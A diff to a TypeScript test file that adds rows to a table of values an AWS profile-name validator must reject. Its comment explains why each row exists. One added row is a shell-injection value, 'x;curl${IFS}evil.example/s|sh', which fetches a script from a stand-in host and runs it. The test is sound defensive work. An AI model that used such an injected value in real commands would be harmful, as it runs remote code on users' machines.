@@ -244,16 +244,23 @@ interface SsoRun {
 /**
  * Values that pass every SHAPE bound and are still not profile names.
  *
- * The unedited auth-template placeholder is 29 characters drawn entirely from
- * the AWS profile-name charset, so NO tightening of `SAFE_PROFILE_NAME` can
- * reject it — only the equality check added for CR-01 does. Interpolating it
- * produces `aws sso login --profile REPLACE_WITH_AWS_PROFILE_NAME`, a
- * copy-pasteable command that cannot work, with the RB-03-03 pointer
- * suppressed. That is the exact dead end `PROFILE_PLACEHOLDER` exists to
- * expose, reached by the one value the template itself ships.
+ * A table rather than one case, because the two rows are rejected by DIFFERENT
+ * mechanisms and each would pass under the other:
+ *
+ *   - the unedited auth-template placeholder is 29 characters drawn entirely
+ *     from the AWS profile-name charset, so NO tightening of
+ *     `SAFE_PROFILE_NAME` can reject it — only the equality check added for
+ *     CR-01 does. Interpolating it produces
+ *     `aws sso login --profile REPLACE_WITH_AWS_PROFILE_NAME`, a copy-pasteable
+ *     command that cannot work, with the RB-03-03 pointer suppressed.
+ *   - the shell-metacharacter name is rejected by the charset bound (WR-01) and
+ *     by nothing else. It is 30 characters with no whitespace, so the old
+ *     `/^[^\s]{1,64}$/` passed it and this repository composed a shell line the
+ *     user is being trained to paste.
  */
 const NOT_A_PROFILE: ReadonlyArray<readonly [string, string]> = [
 	["the unedited auth-template placeholder", PROFILE_TEMPLATE_SENTINEL],
+	["a name carrying shell metacharacters", "x;curl${IFS}evil.example/s|sh"],
 ];
 
 let ssoRuns: SsoRun[];
